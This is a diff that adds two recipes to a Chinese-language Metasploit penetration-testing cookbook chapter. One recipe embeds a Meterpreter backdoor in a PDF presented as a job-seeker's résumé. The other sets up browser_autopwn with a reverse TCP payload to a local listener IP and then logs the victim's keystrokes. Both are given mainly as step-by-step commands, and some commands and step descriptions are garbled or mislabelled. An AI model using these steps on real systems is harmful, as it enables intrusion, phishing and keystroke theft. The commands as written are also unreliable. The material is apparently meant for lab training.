@@ -202,7 +202,7 @@ MSFCLI 的一些命令是：
 
 +   `msfcli -h`：显示 MSFCLI 的帮助文档。
 
-+   `msfcli [PATH TO EXPLOIT] [options = value]`：这是启动漏洞利用的语法。
++   `msfcli [PATH TO EXPLOIT] [options = value]`：这是执行漏洞利用的语法。
 
 ### 准备
 
@@ -264,7 +264,7 @@ MSFCLI 的一些命令是：
     
 ### 工作原理
 
-这个秘籍中，我们以启动 MSFCLI 开始，之后搜索可用的模块，并执行该模块。在搜索的过程中，我们选修了圣诞树扫描模块并复查了 MSFCLI 界面来查看模块概览和所有可用选项。在设置完所有选项之后，我们运行了漏洞利用。
+这个秘籍中，我们以启动 MSFCLI 开始，之后搜索可用的模块，并执行该模块。在搜索的过程中，我们选修了圣诞树扫描模块并复查了 MSFCLI 界面来查看模块概览和所有可用选项。在设置完所有选项之后，我们执行了漏洞利用。
 
 了解 Metasploit 框架分为三个不同的部分非常重要。这些部分是：
 
@@ -272,7 +272,7 @@ MSFCLI 的一些命令是：
 
 +   漏洞利用：漏洞利用是用来利用所发现漏洞的模块。
 
-+   载荷：一旦成功运行了漏洞利用，必须把载荷传给被攻击的机器，以便允许我们创建 shell，运行各种命令，添加用户以及其它。
++   载荷：一旦成功执行了漏洞利用，必须把载荷传给被攻击的机器，以便允许我们创建 shell，运行各种命令，添加用户以及其它。
 
 一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。
 
@@ -616,3 +616,170 @@ MSFCLI 的一些命令是：
 
 这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 Tomcat 漏洞。我们以启动控制台并搜索所有已知的 Tomcat 模块来开始。在选择 Tomcat 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 Tomcat 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 Tomcat 数据库。之后找到生效的登录和密码组合旁边的`+`符号就可以了。
 
+## 6.9 Metasploitable PDF
+
+这个秘籍中，我们会探索如何使用 Metasploit 来执行攻击，使用 Adobe PDF 内嵌模块来利用 PDF 文档漏洞。Adobe PDF 是文档传输的标准。由于它的广泛使用，尤其是由于它的商业用途，我们会通过让用户认为他们打开了来自求职岗位的正常 PDF 文档来攻击用户的机器。
+
+### 准备
+
+需要满足下列要求：
+
++   内部网络的连接。
+
++   运行在渗透环境中的 Metasploitable 。
+
++   用于执行字典攻击的单词列表。
+
+### 操作步骤
+
+让我们通过打开终端窗口来开始这个秘籍：
+
+1.  打开终端窗口。
+
+2.  启动 MSFCONSOLE。
+
+    ```
+    msfconsole 
+    ```
+    
+3.  搜索可用的 PDF 模块。
+
+    ```
+    msfconsole pdf
+    ```
+    
+    ![](img/6-9-1.jpg)
+    
+4.  使用 PDF 内嵌模块：
+
+    ```
+    use exploit/windows/fileformat/adobe_pdf_embedded_exe 
+    ```
+    
+5.  显示模块的可用选项。
+
+    ```
+    show options
+    ```
+    
+    ![](img/6-9-2.jpg)
+    
+6.  设置我们想要生成的 PDF 文件名称：
+
+    ```
+    set FILENAME evildocument.pdf
+    ```
+    
+7.  设置 INFILENAME 选项。它是你打算使用的 PDF 文件的位置。这里，我使用桌面上的简历。
+
+    ```
+    set INFILENAME /root/Desktop/willie.pdf
+    ```
+    
+    > 要注意，这个模块的所有选项都是可选的，除了`INFILENAME `。
+    
+8.  执行漏洞利用：
+
+    ```
+    Exploit
+    ```
+    
+    ![](img/6-9-3.jpg)
+    
+### 工作原理
+
+这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 创建了包含 Meterpreter 后门的 PDF 文件。我们以启动控制台并搜索所有可用的 PDF 漏洞来开始。在选择 PDF 内嵌模块之后，我们设置选项并执行漏洞利用，这让我们在正常的 PDF 中埋下后门程序。Metasploit 会生成带有 Windows 反向 TCP 载荷的 PDF。当你的目标打开 PDF 文件时，Meterpreter 会开启答复并激活会话。
+
+## 6.10 实现 browser_autopwn
+
+浏览器 Autopwn 是 Metasploit 提供的辅助模块，在受害者访问网页时，让你能够自动化对它们的攻击。浏览器 Autopwn 在攻击之前指定客户端的指纹识别，也就是说他不会对 IE 7 尝试利用 Firefox 的漏洞。基于它的浏览器判断，它决定最适于实施哪个漏洞利用。
+
+### 准备
+
+需要互联网或内部网络的连接。
+
+### 操作步骤
+
+让我们通过打开终端窗口来开始这个秘籍：
+
+1.  打开终端窗口。
+
+2.  启动 MSFCONSOLE：
+
+    ```
+    msfconsole 
+    ```
+    
+3.  搜索可用的 `autopwn` 模块。
+
+    ```
+    msfconsole autopwn
+    ```
+    
+    ![](img/6-10-1.jpg)
+    
+4.  使用` browser_autopwn `模块：
+
+    ```
+    Use auxiliary/server/browser_autopwn
+    ```
+    
+5.  设置我们的载荷，这里我们使用 Windows 反向 TCP：
+
+    ```
+    set payload windows/meterpreter/reverse_tcp 
+    ```
+    
+6.  显示可用于该载荷类型的选项。
+
+    ```
+    show options
+    ```
+    
+7.  设置反向连接所使用的 IP。这里，该 PC 的 IP 地址为` 192.168.10.109`。
+
+    ```
+    set LHOST 192.168.10.109
+    ```
+    
+8.  下面，我们打算设置 URIPATH，这里我们使用`"filetypes"`（带引号）：
+
+    ```
+    set URIPATH "filetypes" 
+    ```
+    
+9.  最后，我们执行漏洞利用：
+
+    ```
+    exploit
+    ```
+    
+0.  Metasploit 会在 IP 地址 <http://[Provided IP Address]:8080> 处执行漏洞利用。
+
+1.  当访问者访问这个地址时，`browser_autopwn`模块尝试连接用户的机器来建立远程会话。如果成功的话，Meterpreter 会确认这个会话。使用会话命令来激活它：
+
+    ```
+    session –I 1
+    ```
+    
+2.  为了显示我们可以使用的 Meterpreter 命令列表，输入`help`。
+
+    ```
+    help
+    ```
+    
+3.  会显示可用命令的列表。这里，我们启动击键顺序扫描：
+
+    ```
+    keyscan_start 
+    ```
+    
+4.  为了得到受害者机器上的击键顺序，我们键入`keyscan_start`命令：
+
+    ```
+    keyscan_dump
+    ```
+    
+### 工作原理
+
+这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来执行 browser_autopwn 漏洞利用。我们以启动控制台并搜索所有已知的`autopwn`模块开始。在喧嚣`autopwn`模块之后，我们将载荷设置为`windows_reverse_tcp`。这允许我们在利用成功时得到返回的链接。一旦受害者访问了我们的网页，漏洞利用就成功了，我们就能得到 Meterpreter 活动会话。
